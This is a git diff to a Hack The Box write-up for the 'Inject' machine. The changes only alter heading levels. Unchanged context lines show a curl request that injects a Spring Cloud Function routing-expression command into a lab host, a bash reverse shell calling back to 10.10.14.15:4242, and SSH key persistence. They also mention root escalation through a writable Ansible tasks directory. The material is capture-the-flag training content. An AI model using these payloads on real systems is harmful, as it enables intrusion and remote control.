@@ -10,7 +10,7 @@ date: 2023-07-02
 
 ---
 
-## Enumeration
+# Enumeration
 After running Nmap we can see that only ports `22` and `8080` are open.
 
 ```sh
@@ -211,7 +211,7 @@ As a proof of concept, I was able to create a file at `/tmp/test` by running the
 curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
 ```
 
-## Reverse shell
+# Reverse shell
 Spawning a reverse shell was difficult. Most of my attempts to run payloads within the `exec()` method failed to work. For some reason, any time I tried to run a command with flags the payload would stop working.
 
 > [!Tip]
@@ -235,7 +235,7 @@ frank@inject:/$
 > [!success]
 > By using the payload `new String[]{"bash","-c","bash -i >& /dev/tcp/10.10.14.15/4242 0>&1"` we were able to get a reverse shell as `frank`!
 
-## Lateral privilege escalation
+# Lateral privilege escalation
 We can improve our shell by directing our public key into `frank`'s `authorized_keys` file and logging in through SSH.
 
 ```sh
@@ -264,7 +264,7 @@ phil
 > user.txt
 > ```
 
-## Privilege escalation to root
+# Privilege escalation to root
 Now that we are `phil` we can work on the privesc to the `root` user.
 
 In the `/opt/automation/tasks` directory, there is an Ansible playbook file that has a single task used to check to make sure the web app is running. The directory is owned by the `staff` group, which coincidentally `phil` is a user of, meaning we can write our own files.
@@ -304,7 +304,7 @@ phil@inject:/opt/automation/tasks$ vim copy-flag.yml
 
 ---
 
-## Conclusion
+# Conclusion
 I enjoyed working through this box. I found the steps to get a reverse shell more challenging than some of the other easy Hack The Box boxes I've completed, but it was not so challenging that I felt stuck.
 
 Some of my past DevOps experience made the privesc to `root` using Ansible quite straightforward, so that was encouraging. This was a great box to get back into the swing of things with HTB, and it felt great to root it in a single sitting.
